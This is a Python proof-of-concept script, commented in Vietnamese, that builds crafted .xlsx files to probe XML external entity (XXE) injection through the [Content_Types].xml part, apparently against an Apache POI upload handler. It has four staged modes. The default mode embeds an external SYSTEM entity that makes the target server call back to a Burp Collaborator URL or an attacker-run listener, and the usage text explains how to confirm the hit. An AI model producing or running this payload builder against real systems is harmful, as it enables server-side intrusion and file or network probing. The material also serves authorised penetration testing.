#!/usr/bin/env python3
"""
Tao file .xlsx (OOXML) de test XXE qua [Content_Types].xml theo tung buoc (staged),
giup tach nguyen nhan loi "Can't read Content Types part" (POI bao loi rat chung,
boc tat ca exception trong luc doc [Content_Types].xml lai thanh 1 message duy nhat).

4 mode, chay lan luot tu tren xuong, chi dung khi mode truoc THANH CONG (khong loi
"Can't read Content Types part"):

  1. baseline  -> file .xlsx hop le, KHONG co DOCTYPE. Muc dich: xac nhan cau truc
                  zip/OOXML cua minh dung, loai tru kha nang do minh build file sai.
  2. doctype   -> them <!DOCTYPE Types> RONG (khong entity). Muc dich: kiem tra parser
                  co chan thang DOCTYPE bat ke noi dung hay khong (disallow-doctype-decl).
  3. internal  -> them <!ENTITY xxe "gia-tri-tinh"> (entity NOI BO, khong SYSTEM) va
                  dung &xxe; thay 1 gia tri attribute. Muc dich: kiem tra co the
                  khai bao+dung entity ma khong bi loi, tach rieng van de "DOCTYPE noi
                  chung" voi van de "external entity ra ngoai" cu the.
  4. external  -> ban XXE thuc su: <!ENTITY xxe SYSTEM "..."> (payload cu, gio la mode
                  mac dinh).

Cach doc ket qua:
  - baseline loi         -> file build sai cau truc, sua lai script/file mau.
  - baseline OK, doctype loi
      -> parser chan DOCTYPE ngay khi thay khai bao (bat ke co entity gi khong).
         => XXE KHONG kha thi qua sink nay, dung dieu tra tiep, ghi nhan "da harden".
  - doctype OK, internal loi
      -> la, hiem gap (DOCTYPE rong duoc nhung co ENTITY thi loi) - bao lai ket qua
         cu the de phan tich them.
  - internal OK, external loi/timeout
      -> DOCTYPE + entity noi bo deu on, chi rieng buoc RESOLVE ra ngoai (network)
         gap van de -> rat co the la do MANG (khong co egress), khong phai do code
         chan XXE. Kiem tra kem theo do tre response (timeout dai) de cung co.
  - external OK (parse qua, loi khac ve sau hoac 200)
      -> XXE that, chi can xac nhan qua callback (Burp/listener) hoac qua timing.

Usage:
    python poc_xxe_builder.py --mode baseline --output poc.xlsx
    python poc_xxe_builder.py --mode doctype  --output poc.xlsx
    python poc_xxe_builder.py --mode internal --output poc.xlsx
    python poc_xxe_builder.py --mode external --url "http://abcdefgh12345.oastify.com" --output poc.xlsx
    python poc_xxe_builder.py --mode external --host 192.168.x.x --port 8000 --output poc.xlsx
"""

import argparse
import zipfile
import io

ROOT_RELS = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>"""

WORKBOOK_XML = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
<sheets>
<sheet name="Sheet1" sheetId="1" r:id="rId1"/>
</sheets>
</workbook>"""

WORKBOOK_RELS = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
</Relationships>"""

SHEET1_XML = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
<sheetData/>
</worksheet>"""

GOOD_CONTENT_TYPE = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"

CT_BASELINE = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/xl/workbook.xml" ContentType="{good_ct}"/>
<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
</Types>""".format(good_ct=GOOD_CONTENT_TYPE)

CT_DOCTYPE_EMPTY = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE Types>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/xl/workbook.xml" ContentType="{good_ct}"/>
<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
</Types>""".format(good_ct=GOOD_CONTENT_TYPE)

CT_INTERNAL_ENTITY = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE Types [<!ENTITY xxe "{good_ct}">]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/xl/workbook.xml" ContentType="&xxe;"/>
<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
</Types>""".format(good_ct=GOOD_CONTENT_TYPE)

CT_EXTERNAL_ENTITY = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE Types [<!ENTITY xxe SYSTEM "{callback_url}">]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/xl/workbook.xml" ContentType="&xxe;"/>
<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
</Types>"""


def build_xlsx(content_types_xml: str) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", content_types_xml)
        zf.writestr("_rels/.rels", ROOT_RELS)
        zf.writestr("xl/workbook.xml", WORKBOOK_XML)
        zf.writestr("xl/_rels/workbook.xml.rels", WORKBOOK_RELS)
        zf.writestr("xl/worksheets/sheet1.xml", SHEET1_XML)
    return buf.getvalue()


def main():
    parser = argparse.ArgumentParser(description="Build staged XXE test .xlsx (OOXML) payloads")
    parser.add_argument("--mode", choices=["baseline", "doctype", "internal", "external"],
                         default="external", help="Buoc test (xem docstring). Default: external (XXE thuc su)")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("--url", help="URL Burp Collaborator (chi can khi --mode external)")
    group.add_argument("--host", help="IP may attacker de tu chay listener (chi can khi --mode external)")
    parser.add_argument("--port", type=int, default=8000, help="Port listener khi dung --host (default: 8000)")
    parser.add_argument("--callback-path", default="xxe-hit", help="Path callback khi dung --host")
    parser.add_argument("--output", default="poc.xlsx", help="Ten file output (default: poc.xlsx)")
    args = parser.parse_args()

    if args.mode == "baseline":
        content_types = CT_BASELINE
    elif args.mode == "doctype":
        content_types = CT_DOCTYPE_EMPTY
    elif args.mode == "internal":
        content_types = CT_INTERNAL_ENTITY
    else:
        if args.url:
            callback_url = args.url.rstrip("/")
        elif args.host:
            callback_url = f"http://{args.host}:{args.port}/{args.callback_path}"
        else:
            parser.error("--mode external can --url hoac --host")
        content_types = CT_EXTERNAL_ENTITY.format(callback_url=callback_url)

    data = build_xlsx(content_types)
    with open(args.output, "wb") as f:
        f.write(data)

    print(f"[+] Mode: {args.mode}")
    print(f"[+] Da tao {args.output} ({len(data)} bytes)")
    if args.mode == "external":
        if args.host:
            print(f"[+] Nho chay listener truoc khi upload: python -m http.server {args.port}")
        else:
            print("[+] Nho mo Burp Collaborator client va bam 'Poll now' sau khi upload")


if __name__ == "__main__":
    main()
